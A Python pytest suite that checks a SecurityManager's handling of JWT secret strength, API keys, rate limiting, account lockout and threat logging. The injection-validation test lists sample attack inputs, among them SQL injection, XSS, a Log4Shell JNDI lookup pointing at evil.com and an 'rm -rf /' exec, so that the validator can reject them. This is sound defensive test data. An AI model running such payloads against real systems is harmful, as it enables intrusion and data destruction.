#!/usr/bin/env python3
"""
Security Fix Validation Tests
Tests to ensure all hardcoded credentials and security vulnerabilities are fixed.
"""

import os
import pytest
import tempfile
from unittest.mock import patch, MagicMock
from datetime import datetime, timedelta

# Add src to path for imports
import sys
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'src'))

from core.security_manager import SecurityManager, SecurityConfig, SecurityLevel


class TestSecurityFixes:
    """Test suite for security vulnerability fixes"""
    
    def test_no_hardcoded_jwt_secret_in_config(self):
        """Test that SecurityConfig no longer accepts hardcoded secrets"""
        # Test that default None value raises error
        with pytest.raises(ValueError, match="JWT secret is required"):
            SecurityConfig()
        
        # Test that weak secrets are rejected
        weak_secrets = [
            "your-secret-key",
            "your-secure-secret-key",
            "your-secure-secret-key-change-in-production",
            "secret",
            "password",
            "admin",
            "test"
        ]
        
        for weak_secret in weak_secrets:
            with pytest.raises(ValueError, match="JWT secret cannot be a default or weak value"):
                SecurityConfig(jwt_secret=weak_secret)
    
    def test_jwt_secret_length_validation(self):
        """Test JWT secret length validation"""
        # Test too short secret
        with pytest.raises(ValueError, match="JWT secret must be at least 32 characters"):
            SecurityConfig(jwt_secret="short")
        
        # Test exactly 32 characters (should pass)
        valid_secret = "a" * 32
        config = SecurityConfig(jwt_secret=valid_secret)
        assert config.jwt_secret == valid_secret
        
        # Test longer than 32 characters (should pass)
        long_secret = "a" * 64
        config = SecurityConfig(jwt_secret=long_secret)
        assert config.jwt_secret == long_secret
    
    def test_valid_strong_secret_accepted(self):
        """Test that strong, valid secrets are accepted"""
        strong_secret = "this-is-a-very-strong-secret-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        assert config.jwt_secret == strong_secret
    
    def test_security_config_creation(self):
        """Test that SecurityConfig can be created properly"""
        strong_secret = "strong-secret-for-testing-with-sufficient-length"
        config = SecurityConfig(jwt_secret=strong_secret)
        assert config.jwt_secret == strong_secret
    
    def test_security_manager_api_key_validation(self):
        """Test API key validation with secure configuration"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        security_manager = SecurityManager(config)
        
        # Generate API key
        api_key = security_manager.generate_api_key("test_user", SecurityLevel.OPERATOR)
        
        # Validate API key
        valid, user_id, level = security_manager.validate_api_key(api_key)
        assert valid
        assert user_id == "test_user"
        assert level == SecurityLevel.OPERATOR
    
    def test_security_manager_jwt_validation(self):
        """Test JWT token validation with secure configuration"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        security_manager = SecurityManager(config)
        
        # Generate JWT token
        jwt_token = security_manager.generate_jwt_token("test_user", SecurityLevel.ADMIN)
        
        # Validate JWT token
        valid, user_id, level = security_manager.validate_jwt_token(jwt_token)
        assert valid
        assert user_id == "test_user"
        assert level == SecurityLevel.ADMIN
    
    def test_rate_limiting_functionality(self):
        """Test rate limiting functionality"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        config.rate_limiting.requests_per_minute = 2  # Low limit for testing
        
        security_manager = SecurityManager(config)
        
        # First request should pass
        assert security_manager.check_rate_limit("test_user", "127.0.0.1")
        
        # Second request should pass
        assert security_manager.check_rate_limit("test_user", "127.0.0.1")
        
        # Third request should fail (exceeds limit)
        assert not security_manager.check_rate_limit("test_user", "127.0.0.1")
    
    def test_account_lockout_functionality(self):
        """Test account lockout after failed attempts"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(
            jwt_secret=strong_secret,
            max_failed_attempts=2,
            lockout_duration_minutes=1
        )
        security_manager = SecurityManager(config)
        
        user_id = "test_user"
        
        # Record failed attempts
        security_manager.record_access_attempt("127.0.0.1", user_id, "/test", False, "Invalid credentials")
        assert not security_manager.is_account_locked(user_id)
        
        security_manager.record_access_attempt("127.0.0.1", user_id, "/test", False, "Invalid credentials")
        assert security_manager.is_account_locked(user_id)
    
    def test_input_validation_prevents_injection(self):
        """Test input validation prevents injection attacks"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        security_manager = SecurityManager(config)
        
        # Test various injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "eval(document.cookie)",
            "${jndi:ldap://evil.com/a}",
            "exec('rm -rf /')"
        ]
        
        for malicious_input in malicious_inputs:
            valid, _ = security_manager.validate_command_input(malicious_input)
            assert not valid, f"Malicious input was not detected: {malicious_input}"
    
    def test_security_event_logging(self):
        """Test security event logging functionality"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        security_manager = SecurityManager(config)
        
        # Log a security event
        security_manager.log_security_event(
            "TEST_EVENT",
            security_manager.ThreatLevel.MEDIUM,
            source_ip="127.0.0.1",
            user_id="test_user",
            description="Test security event"
        )
        
        # Check that event was recorded
        assert len(security_manager.security_events) == 1
        event = security_manager.security_events[0]
        assert event.event_type == "TEST_EVENT"
        assert event.source_ip == "127.0.0.1"
        assert event.user_id == "test_user"
    
    def test_threat_analysis_functionality(self):
        """Test threat analysis functionality"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        security_manager = SecurityManager(config)
        
        # Generate some test events
        security_manager.log_security_event(
            "MALICIOUS_INPUT_DETECTED",
            security_manager.ThreatLevel.HIGH,
            source_ip="192.168.1.100",
            description="Potential SQL injection attempt"
        )
        
        # Get threat analysis
        analysis = security_manager.get_threat_analysis()
        
        assert "threat_level" in analysis
        assert "critical_events_24h" in analysis
        assert "recommendations" in analysis
        assert len(analysis["recommendations"]) > 0


class TestCurrentSecurityFeatures:
    """Test current security features in the unified MCP server"""
    
    def test_unified_server_security_config(self):
        """Test that the unified server can create security configurations"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length"
        config = SecurityConfig(jwt_secret=strong_secret)
        security_manager = SecurityManager(config)
        
        # Test that the security manager was created successfully
        assert security_manager is not None
        assert security_manager.config.jwt_secret == strong_secret


if __name__ == "__main__":
    pytest.main([__file__, "-v"])